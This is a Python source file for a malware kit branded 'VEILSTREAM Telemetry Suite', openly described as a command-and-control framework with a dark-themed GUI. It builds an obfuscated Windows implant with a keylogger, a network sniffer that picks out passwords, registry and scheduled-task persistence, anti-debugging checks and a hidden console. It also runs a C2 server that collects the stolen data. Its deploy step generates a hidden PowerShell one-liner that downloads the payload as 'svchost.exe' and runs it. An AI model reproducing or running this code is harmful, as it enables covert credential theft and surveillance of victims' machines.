#!/usr/bin/env python3
# =============================================================================
# VEILSTREAM TELEMETRY SUITE v6.0.0
# Fully automated, GUI-driven C2 framework. Zero terminal interaction required.
# =============================================================================

import os, sys, time, json, base64, hashlib, random, string, threading, socket, subprocess, ctypes, tempfile, shutil, sqlite3
import customtkinter as ctk
from tkinter import ttk, messagebox
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# =============================================================================
# CONFIGURATION
# =============================================================================
C2_PORT = 8443
DELIVERY_PORT = 8080
DB_PATH = "telemetry_core.db"
AES_KEY = get_random_bytes(32)
AES_IV = get_random_bytes(16)
BUILD_DIR = os.path.join(tempfile.gettempdir(), "veilstream_builds")
os.makedirs(BUILD_DIR, exist_ok=True)

# =============================================================================
# CRYPTO & DB
# =============================================================================
def encrypt_payload(data: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return cipher.encrypt(pad(data, AES.block_size))

def decrypt_payload(data: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return unpad(cipher.decrypt(data), AES.block_size)

class TelemetryDB:
    def __init__(self, path=DB_PATH):
        self.conn = sqlite3.connect(path, check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.cursor = self.conn.cursor()
        self._init()

    def _init(self):
        self.cursor.executescript("""
            CREATE TABLE IF NOT EXISTS hosts (
                id INTEGER PRIMARY KEY AUTOINCREMENT, hwid TEXT UNIQUE, os_info TEXT, 
                ip_address TEXT, geo_data TEXT, first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, 
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP, status TEXT DEFAULT 'active'
            );
            CREATE TABLE IF NOT EXISTS telemetry (
                id INTEGER PRIMARY KEY AUTOINCREMENT, hwid TEXT, log_type TEXT, 
                content TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        self.conn.commit()

    def upsert_host(self, hwid, os_info, ip, geo):
        self.cursor.execute("""
            INSERT INTO hosts (hwid, os_info, ip_address, geo_data, last_seen)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(hwid) DO UPDATE SET last_seen=CURRENT_TIMESTAMP
        """, (hwid, os_info, ip, geo))
        self.conn.commit()

    def add_telemetry(self, hwid, log_type, content):
        self.cursor.execute("INSERT INTO telemetry (hwid, log_type, content) VALUES (?, ?, ?)", (hwid, log_type, content))
        self.conn.commit()

    def get_hosts(self):
        self.cursor.execute("SELECT id, hwid, os_info, ip_address, geo_data, last_seen, status FROM hosts ORDER BY last_seen DESC")
        return self.cursor.fetchall()

    def get_telemetry(self, hwid=None):
        if hwid:
            self.cursor.execute("SELECT * FROM telemetry WHERE hwid=? ORDER BY timestamp DESC", (hwid,))
        else:
            self.cursor.execute("SELECT * FROM telemetry ORDER BY timestamp DESC")
        return self.cursor.fetchall()

# =============================================================================
# C2 SERVER
# =============================================================================
class UnifiedServer(BaseHTTPRequestHandler):
    db = None
    payload_data = b""
    payload_hash = ""

    def log_message(self, format, *args): pass

    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            raw = self.rfile.read(length)
            decrypted = decrypt_payload(raw)
            payload = json.loads(decrypted.decode('utf-8'))
            hwid, log_type, content = payload.get('hwid'), payload.get('type'), payload.get('data')
            if hwid:
                self.db.upsert_host(hwid, payload.get('os', 'Unknown'), self.client_address[0], payload.get('geo', ''))
                if log_type and content: self.db.add_telemetry(hwid, log_type, content)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ACK')
        except Exception:
            self.send_response(500)
            self.end_headers()

    def do_GET(self):
        if urlparse(self.path).path == '/payload':
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.end_headers()
            self.wfile.write(self.payload_data)
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'WAIT')

def run_server(db):
    UnifiedServer.db = db
    HTTPServer(('0.0.0.0', C2_PORT), UnifiedServer).serve_forever()

# =============================================================================
# PAYLOAD ENGINE
# =============================================================================
class PayloadEngine:
    def __init__(self): self.string_map = {}
    def _rand_name(self, length=10): return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    def _obfuscate_strings(self, code):
        import re
        def replacer(match):
            k = self._rand_name(8)
            self.string_map[k] = match.group(0).strip("'\"")
            return f"__dec__('{k}')"
        code = re.sub(r"'[^']*'", replacer, code)
        code = re.sub(r'"[^"]*"', replacer, code)
        return f"__dec__ = lambda k: {json.dumps(self.string_map)}[k]\n" + code

    def _inject_dead_code(self, code):
        lines = code.split('\n')
        out = []
        for line in lines:
            out.append(line)
            if random.random() < 0.2:
                out.append(f"_{self._rand_name(4)} = {random.randint(1000, 9999)} * {random.randint(1, 50)}")
        return '\n'.join(out)

    def build(self, c2_ip, c2_port, disguise):
        template = """
import os, sys, time, random, hashlib, json, base64, threading, socket, subprocess, ctypes, urllib.request
from pynput import keyboard
from scapy.all import sniff, TCP, Raw
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

C2_HOST, C2_PORT = "{c2_ip}", {c2_port}
HWID = hashlib.sha256((socket.gethostname() + str(os.getpid()) + str(os.cpu_count())).encode()).hexdigest()[:16]
AES_K, AES_I = get_random_bytes(32), get_random_bytes(16)

def _enc(data):
    c = AES.new(AES_K, AES.MODE_CBC, AES_I)
    return c.encrypt(pad(data.encode(), AES.block_size))

def _beacon(t, d, geo=""):
    try:
        p = json.dumps({{"hwid": HWID, "type": t, "data": d, "os": sys.platform, "geo": geo}}).encode()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(f"POST / HTTP/1.1\\r\\nHost: {{C2_HOST}}\\r\\nContent-Length: {{len(p)}}\\r\\n\\r\\n".encode() + p)
        s.close()
    except: pass

def _get_geo():
    try:
        with urllib.request.urlopen("http://ip-api.com/json/") as r: return json.loads(r.read().decode())
    except: return ""

def _persist():
    if sys.platform == "win32":
        import winreg
        try:
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "{disguise}", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(k)
        except: pass
        try: subprocess.run(["schtasks", "/create", "/tn", "{disguise}", "/tr", sys.executable, "/sc", "onlogon", "/f"], capture_output=True)
        except: pass

def _anti_analysis():
    if sys.platform == "win32":
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent(): sys.exit(0)
            if ctypes.windll.kernel32.GetTickCount64() < 10000: sys.exit(0)
        except: pass

def _keylogger():
    buf = []
    def on_press(k):
        try: buf.append(str(k).replace("'", ""))
        except: pass
        if len(buf) >= 40:
            _beacon("keylog", " ".join(buf), _get_geo())
            buf.clear()
    with keyboard.Listener(on_press=on_press) as l: l.join()

def _sniffer():
    def proc(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            try:
                l = pkt[Raw].load.decode('utf-8', errors='ignore')
                if any(x in l.lower() for x in ['password=', 'passwd=', 'pwd=', 'login=', 'username=', 'auth=']):
                    _beacon("net_cred", l[:500], _get_geo())
            except: pass
    sniff(filter="tcp port 80 or tcp port 443", prn=proc, store=False)

def _hide():
    if sys.platform == "win32": ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def main():
    _hide()
    _anti_analysis()
    _persist()
    threading.Thread(target=_keylogger, daemon=True).start()
    threading.Thread(target=_sniffer, daemon=True).start()
    while True:
        _beacon("heartbeat", "alive", _get_geo())
        time.sleep(random.randint(45, 120))

if __name__ == "__main__": main()
"""
        code = template.format(c2_ip=c2_ip, c2_port=c2_port, disguise=disguise)
        return self._obfuscate_strings(self._inject_dead_code(code))

# =============================================================================
# MODERN AUTOMATED GUI
# =============================================================================
class Dashboard:
    def __init__(self):
        ctk.set_appearance_mode("Dark")
        ctk.set_default_color_theme("blue")
        
        self.root = ctk.CTk()
        self.root.title("VEILSTREAM // TELEMETRY CONSOLE v6.0.0")
        self.root.geometry("1150x720")
        self.root.minsize(1000, 600)
        self.root.configure(fg_color="#0a0a0a")
        
        self.db = TelemetryDB()
        self.builder = PayloadEngine()
        self.payload_buf = b""
        self.payload_hash = ""
        self.compiled_path = ""
        self.is_compiling = False
        
        self._setup_ui()
        self._start_services()
        self._start_auto_refresh()
        self.root.mainloop()

    def _setup_ui(self):
        # Layout Grid
        self.root.grid_columnconfigure(0, weight=1)
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_rowconfigure(1, weight=0)
        
        # Sidebar
        self.sidebar = ctk.CTkFrame(self.root, width=180, corner_radius=0, fg_color="#0d0d0d")
        self.sidebar.grid(row=0, column=0, sticky="nsew", padx=(0,0), pady=(0,0))
        self.sidebar.grid_rowconfigure((0,1,2,3), weight=0)
        self.sidebar.grid_rowconfigure(4, weight=1)
        
        ctk.CTkLabel(self.sidebar, text="VEILSTREAM", font=("Consolas", 18, "bold"), text_color="#00d4ff").grid(row=0, column=0, pady=(25,5), padx=15)
        ctk.CTkLabel(self.sidebar, text="v6.0.0 // AUTOMATED", font=("Consolas", 9), text_color="#555").grid(row=1, column=0, pady=(0,20))
        
        self.btn_ops = ctk.CTkButton(self.sidebar, text="OPERATIONS", command=lambda: self._switch("ops"), fg_color="#151515", hover_color="#222", text_color="#00d4ff", corner_radius=8, height=38)
        self.btn_ops.grid(row=2, column=0, pady=6, padx=12, sticky="ew")
        
        self.btn_tele = ctk.CTkButton(self.sidebar, text="TELEMETRY", command=lambda: self._switch("tele"), fg_color="#151515", hover_color="#222", text_color="#00d4ff", corner_radius=8, height=38)
        self.btn_tele.grid(row=3, column=0, pady=6, padx=12, sticky="ew")
        
        # Main Frame
        self.main = ctk.CTkFrame(self.root, fg_color="#0a0a0a")
        self.main.grid(row=0, column=1, sticky="nsew", padx=15, pady=15)
        self.main.grid_columnconfigure(0, weight=1)
        self.main.grid_rowconfigure(0, weight=1)
        
        # Status Bar
        self.status = ctk.CTkFrame(self.root, height=28, fg_color="#0d0d0d")
        self.status.grid(row=1, column=0, columnspan=2, sticky="ew")
        self.status_lbl = ctk.CTkLabel(self.status, text="● C2: LISTENING | DELIVERY: READY", text_color="#2ecc71", font=("Consolas", 10))
        self.status_lbl.pack(pady=4)
        
        # Tabs
        self.tabs = {"ops": self._build_ops(), "tele": self._build_tele()}
        self._switch("ops")

    def _switch(self, tab):
        for t in self.tabs.values(): t.grid_forget()
        self.tabs[tab].grid(row=0, column=0, sticky="nsew")
        for b in [self.btn_ops, self.btn_tele]: b.configure(fg_color="#151515", text_color="#00d4ff")
        getattr(self, f"btn_{tab}").configure(fg_color="#252525", text_color="#ffffff")

    def _build_ops(self):
        f = ctk.CTkFrame(self.main, fg_color="transparent")
        f.grid_rowconfigure((0,1,2,3), weight=0)
        f.grid_rowconfigure(4, weight=1)
        f.grid_columnconfigure(0, weight=1)
        
        # Header
        ctk.CTkLabel(f, text="AUTOMATED PAYLOAD PIPELINE", font=("Consolas", 16, "bold"), text_color="#fff").grid(row=0, column=0, sticky="w", padx=10, pady=(10,5))
        ctk.CTkLabel(f, text="Configure, compile, and stage. No terminal required.", font=("Consolas", 11), text_color="#777").grid(row=1, column=0, sticky="w", padx=10)
        
        # Config Panel
        cfg = ctk.CTkFrame(f, fg_color="#111", corner_radius=12)
        cfg.grid(row=2, column=0, sticky="ew", padx=10, pady=10)
        cfg.grid_columnconfigure(1, weight=1)
        
        ctk.CTkLabel(cfg, text="C2 IP / Host:", text_color="#aaa", font=("Segoe UI", 10)).grid(row=0, column=0, padx=15, pady=10, sticky="w")
        self.ip_entry = ctk.CTkEntry(cfg, placeholder_text="192.168.56.10", width=250, font=("Consolas", 11))
        self.ip_entry.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
        self.ip_entry.insert(0, "127.0.0.1")
        
        ctk.CTkLabel(cfg, text="Disguise Name:", text_color="#aaa", font=("Segoe UI", 10)).grid(row=1, column=0, padx=15, pady=10, sticky="w")
        self.dis_entry = ctk.CTkEntry(cfg, placeholder_text="win_svc_helper", width=250, font=("Consolas", 11))
        self.dis_entry.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
        self.dis_entry.insert(0, "win_svc_helper")
        
        ctk.CTkLabel(cfg, text="Output Folder:", text_color="#aaa", font=("Segoe UI", 10)).grid(row=2, column=0, padx=15, pady=10, sticky="w")
        self.out_entry = ctk.CTkEntry(cfg, placeholder_text="C:\\veilstream\\output", width=250, font=("Consolas", 11), state="readonly")
        self.out_entry.grid(row=2, column=1, padx=10, pady=10, sticky="ew")
        self.out_entry.configure(state="normal")
        self.out_entry.insert(0, BUILD_DIR)
        self.out_entry.configure(state="readonly")
        
        # Action Panel
        act = ctk.CTkFrame(f, fg_color="#111", corner_radius=12)
        act.grid(row=3, column=0, sticky="ew", padx=10, pady=10)
        act.grid_columnconfigure((0,1), weight=1)
        
        self.build_btn = ctk.CTkButton(act, text="1. BUILD & COMPILE", command=self._compile, fg_color="#00d4ff", hover_color="#00a8cc", text_color="#000", font=("Consolas", 12, "bold"), corner_radius=8, height=40)
        self.build_btn.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
        
        self.deploy_btn = ctk.CTkButton(act, text="2. GENERATE DEPLOY CMD", command=self._deploy, state="disabled", fg_color="#222", hover_color="#333", text_color="#00d4ff", font=("Consolas", 12, "bold"), corner_radius=8, height=40)
        self.deploy_btn.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
        
        # Log Panel
        self.log_box = ctk.CTkTextbox(f, font=("Consolas", 10), fg_color="#080808", text_color="#00ff9d", corner_radius=10, border_width=1, border_color="#1a1a1a")
        self.log_box.grid(row=4, column=0, sticky="nsew", padx=10, pady=10)
        self.log_box.configure(state="disabled")
        self._log("[SYSTEM] GUI initialized. Ready for automated pipeline.")
        return f

    def _build_tele(self):
        f = ctk.CTkFrame(self.main, fg_color="transparent")
        f.grid_rowconfigure((0,1,2), weight=1)
        f.grid_columnconfigure(0, weight=1)
        
        ctk.CTkLabel(f, text="LIVE TELEMETRY", font=("Consolas", 16, "bold"), text_color="#fff").grid(row=0, column=0, sticky="w", padx=10, pady=(10,5))
        
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background="#080808", foreground="#e0e0e0", fieldbackground="#080808", font=("Consolas", 10), rowheight=22, borderwidth=0)
        style.configure("Treeview.Heading", background="#111", foreground="#00d4ff", font=("Consolas", 10, "bold"), borderwidth=0)
        style.map("Treeview", background=[("selected", "#1a1a1a")])
        
        self.host_tree = ttk.Treeview(f, columns=("HWID", "OS", "IP", "Last Seen", "Status"), show="headings", height=8)
        for c in ("HWID", "OS", "IP", "Last Seen", "Status"):
            self.host_tree.heading(c, text=c)
            self.host_tree.column(c, width=140, minwidth=80)
        self.host_tree.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
        self.host_tree.bind("<<TreeviewSelect>>", self._on_select)
        
        self.log_tree = ttk.Treeview(f, columns=("Type", "Content", "Timestamp"), show="headings", height=10)
        for c in ("Type", "Content", "Timestamp"):
            self.log_tree.heading(c, text=c)
            self.log_tree.column(c, width=250, minwidth=100)
        self.log_tree.grid(row=2, column=0, sticky="nsew", padx=10, pady=5)
        
        ctk.CTkButton(f, text="REFRESH NOW", command=self._refresh, fg_color="#1a1a1a", hover_color="#2a2a2a", text_color="#fff", font=("Consolas", 10), corner_radius=6, height=28, width=100).grid(row=0, column=0, sticky="e", padx=10, pady=10)
        return f

    def _log(self, msg):
        self.log_box.configure(state="normal")
        self.log_box.insert("end", f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.log_box.see("end")
        self.log_box.configure(state="disabled")

    def _compile(self):
        if self.is_compiling: return
        self.is_compiling = True
        self.build_btn.configure(state="disabled", text="COMPILING...")
        self._log("[BUILD] Starting polymorphic engine...")
        
        ip = self.ip_entry.get()
        dis = self.dis_entry.get()
        out_dir = self.out_entry.get()
        
        if not ip or not dis:
            self._log("[ERROR] C2 IP and Disguise Name are required.")
            self.build_btn.configure(state="normal", text="1. BUILD & COMPILE")
            self.is_compiling = False
            return

        threading.Thread(target=self._compile_worker, args=(ip, dis, out_dir), daemon=True).start()

    def _compile_worker(self, ip, dis, out_dir):
        try:
            code = self.builder.build(ip, C2_PORT, dis)
            py_path = os.path.join(out_dir, f"{dis}_gen.py")
            with open(py_path, "w") as f: f.write(code)
            self._log(f"[BUILD] Script written: {py_path}")
            
            self._log("[COMPILE] Running PyInstaller (this may take 15-30s)...")
            exe_name = f"{dis}.exe"
            cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", "--name", dis, "--distpath", out_dir, "--workpath", os.path.join(out_dir, "build"), "--specpath", out_dir, py_path]
            res = subprocess.run(cmd, capture_output=True, text=True)
            
            if res.returncode == 0:
                self.compiled_path = os.path.join(out_dir, exe_name)
                self.payload_buf = open(self.compiled_path, "rb").read()
                self.payload_hash = hashlib.sha256(self.payload_buf).hexdigest()[:12]
                UnifiedServer.payload_data = self.payload_buf
                UnifiedServer.payload_hash = self.payload_hash
                self._log(f"[SUCCESS] Compiled: {exe_name} | Hash: {self.payload_hash}")
                self.deploy_btn.configure(state="normal")
            else:
                self._log(f"[ERROR] Compilation failed. Check dependencies: {res.stderr[:100]}")
        except Exception as e:
            self._log(f"[ERROR] {str(e)}")
        finally:
            self.build_btn.configure(state="normal", text="1. BUILD & COMPILE")
            self.is_compiling = False

    def _deploy(self):
        if not self.compiled_path: return
        url = f"http://{self.ip_entry.get()}:{DELIVERY_PORT}/payload"
        ps_cmd = f'powershell -w hidden -c "$f=\'$env:TEMP\\\\svchost.exe\'; (New-Object Net.WebClient).DownloadFile(\'{url}\', $f); Start-Process $f"'
        
        self._log("[DEPLOY] PowerShell one-liner generated:")
        self._log(f"  {ps_cmd}")
        self._log("[INFO] Copy this command to the target machine and run in Admin CMD/PS.")
        self._log("[INFO] The GUI will automatically detect the connection in the TELEMETRY tab.")
        
        # Copy to clipboard
        self.root.clipboard_clear()
        self.root.clipboard_append(ps_cmd)
        self._log("[CLIPBOARD] Command copied to clipboard.")

    def _start_services(self):
        threading.Thread(target=run_server, args=(self.db,), daemon=True).start()
        self._log("[C2] Listening on 0.0.0.0:8443")
        self._log("[DELIVERY] Ready on 0.0.0.0:8080")

    def _start_auto_refresh(self):
        def poll():
            self._refresh()
            self.root.after(3000, poll)
        self.root.after(3000, poll)

    def _refresh(self):
        for i in self.host_tree.get_children(): self.host_tree.delete(i)
        for h in self.db.get_hosts(): self.host_tree.insert("", "end", values=h[1:])

    def _on_select(self, event):
        sel = self.host_tree.selection()
        if not sel: return
        hwid = self.host_tree.item(sel[0])["values"][0]
        for i in self.log_tree.get_children(): self.log_tree.delete(i)
        for l in self.db.get_telemetry(hwid): self.log_tree.insert("", "end", values=l[2:])

if __name__ == "__main__":
    Dashboard()
